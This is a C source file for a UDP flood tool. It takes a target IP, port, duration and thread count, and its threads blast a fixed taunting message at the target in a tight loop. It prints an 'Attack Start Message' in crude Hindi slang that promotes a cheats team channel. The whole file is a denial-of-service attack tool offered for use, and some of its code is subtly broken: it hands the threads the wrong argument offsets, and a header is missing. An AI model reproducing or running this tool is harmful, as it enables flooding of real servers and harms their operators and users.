#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>

// Function for sending UDP traffic
void *send_udp_traffic(void *arg) {
    char *ip = ((char **)arg)[0];
    int port = atoi(((char **)arg)[1]);
    int duration = atoi(((char **)arg)[2]);
    int thread_count = atoi(((char **)arg)[3]);
    struct sockaddr_in target_addr;
    int sock;
    char message[] = "GAA*D MARAAYII CHALU HO GAYI , AB TO HYDRAXCHEATS TEAM CHANNEL JOIN KAR LO";

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    target_addr.sin_addr.s_addr = inet_addr(ip);

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < duration) {
        sendto(sock, message, strlen(message), 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
    }

    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <Port> <Time> <Threads>\n", argv[0]);
        return 1;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int thread_count = atoi(argv[4]);
    pthread_t threads[thread_count];

    printf("Attack Start Message: GAA*D MARAAYII CHALU HO GAYI , AB TO ARMAN TEAM CHANNEL JOIN KAR LO\n");

    for (int i = 0; i < thread_count; i++) {
        pthread_create(&threads[i], NULL, send_udp_traffic, (void *)argv);
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
